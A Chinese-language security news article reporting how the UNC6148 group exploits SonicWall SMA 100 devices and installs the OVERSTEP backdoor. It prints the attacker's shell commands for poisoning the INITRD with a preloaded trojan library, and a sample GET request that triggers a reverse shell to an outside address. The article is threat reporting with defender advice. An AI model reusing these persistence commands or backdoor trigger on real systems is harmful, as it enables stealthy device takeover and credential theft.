> **原文链接**: https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651325149&idx=4&sn=def91ead440f78d348db5fd03eb51f18

#  SonicWall SMA设备零日RCE漏洞遭利用，部署OVERSTEP勒索软件  
 FreeBuf   2025-07-18 10:31  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR38jUokdlWSNlAjmEsO1rzv3srXShFRuTKBGDwkj4gvYy34iajd6zQiaKl77Wsy9mjC0xBCRg0YgDIWg/640?wx_fmt=gif "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qq5rfBadR39qt8cDGMxraNibg1nP3VsQJBic4UCwoXLEdZYL5AslqVnc6phUibpHVecrInY5cSpvXAJ8nQTrR0wVg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
调查人员发现，SonicWall已停产的SMA 100系列设备再次成为攻击目标，攻击者利用疑似零日远程代码执行漏洞，结合名为OVERSTEP的复杂后门程序发起隐蔽攻击。  
  
  
**Part01**  
## 攻击链分析：从凭证窃取到勒索部署  
##   
  
这起被归因于经济利益组织UNC6148的攻击行动，首先窃取管理员凭证和一次性密码种子，随后完全控制设备，最终外泄数据并准备部署勒索软件。  
  
  
攻击链始于一系列HTTP请求，最终使攻击者在设备上获得shell访问权限——这在正常情况下本应无法实现。Google威胁情报分析师指出，攻击者激活shell后会导出设备配置，悄悄注入恶意规则，并将base64编码的二进制文件上传至持久性
```
/cf
```

  
分区。  
  
  
该二进制文件随后被复制到/usr/lib/libsamba-errors.so.6，并通过/etc/ld.so.preload强制在每个进程启动时加载，立即赋予攻击者对设备的root级访问权限。调查人员将初始入侵点与犯罪论坛长期交易的多个SMA漏洞之一相关联。  
  
  
**Part02**  
## 历史漏洞关联分析  
  
  
下表总结了近三年来相关攻击活动利用的最关键漏洞，这些漏洞要么可直接执行代码，要么提供凭证窃取路径：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/qq5rfBadR39qt8cDGMxraNibg1nP3VsQJrvJn53ARoOT4tGbt4IrlR8La5suydYWLSZCRKuEfwDh2sxzS2EDKZA/640?wx_fmt=png&from=appmsg "")  
  
  
dopasswords命令执行的Shell命令显示，OVERSTEP将凭证数据库压缩为可通过web访问的TAR存档，确保攻击者能轻松下载。  
  
  
**Part03**  
## 持久化策略：劫持启动序列  
  
  
一旦获得立足点，UNC6148通过重写/etc/rc.d/rc.fwboot中的bootCurrentFirmware()例程来巩固持久性。修改后的脚本会挂载设备的压缩初始RAM磁盘（INITRD），植入木马化库文件，并重写INITRD.GZ使恶意代码先于任何合法服务加载。  
  
  
时间戳"touch"操作使文件日期与官方内核镜像保持一致，干扰快速元数据检查。以下是攻击者执行的代码片段：  

```
# Extract and poison INITRD
gzip -d $fwLoc/INITRD.GZ
mount -o loop $fwLoc/INITRD $fwLoc/zzz
cp /cf/libsamba-errors.so.6 $fwLoc/zzz/usr/lib/
echo /usr/lib/libsamba-errors.so.6 > $fwLoc/zzz/etc/ld.so.preload
umount $fwLoc/zzz && gzip $fwLoc/INITRD
mv $fwLoc/INITRD.gz $fwLoc/INITRD.GZ
/usr/local/sbin/kexec -l $fwLoc/BZIMAGE --append=&#34;`cat $fwLoc/LINUX.OPT`&#34;
/usr/local/sbin/kexec -e
```

  
  
设备重启后，包括负责日志记录的web服务器在内的所有动态二进制文件都会链接到恶意库。OVERSTEP会hookopen*、readdir*和write函数以隐藏自身，并解析输入缓冲区中的dobackshell或dopasswords字符串。  
  
  
由于在被劫持的write调用中执行了内存日志篡改，像https://device/query?q=dobackshell,1.2.3.4,4444这样的单个HTTP GET请求就能触发反向shell，而不会在磁盘日志中留下痕迹。结果是建立了弹性立足点：只要被盗凭证仍然有效，即使完全打补丁的设备也可能被重新入侵。  
  
  
Google分析师敦促防御者对磁盘进行离线镜像，轮换所有密码和OTP种子，并检查/etc/ld.so.preload是否存在——该文件在SMA硬件上的存在"等同于已被入侵"。  
  
  
**参考来源：**  
  
SonicWall SMA Devices 0-Day RCE Vulnerability Exploited to Deploy OVERSTEP Ransomware  
  
https://cybersecuritynews.com/sonicwall-sma-devices-0-day-rce-vulnerability/  
  
  
###   
###   
###   
  
**推荐阅读**  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651324992&idx=1&sn=8303e67651ddba23a73497aeb18955fa&scene=21#wechat_redirect)  
  
### 电台讨论  
  
****  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/qq5rfBadR3icF8RMnJbsqatMibR6OicVrUDaz0fyxNtBDpPlLfibJZILzHQcwaKkb4ia57xAShIJfQ54HjOG1oPXBew/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
   
  
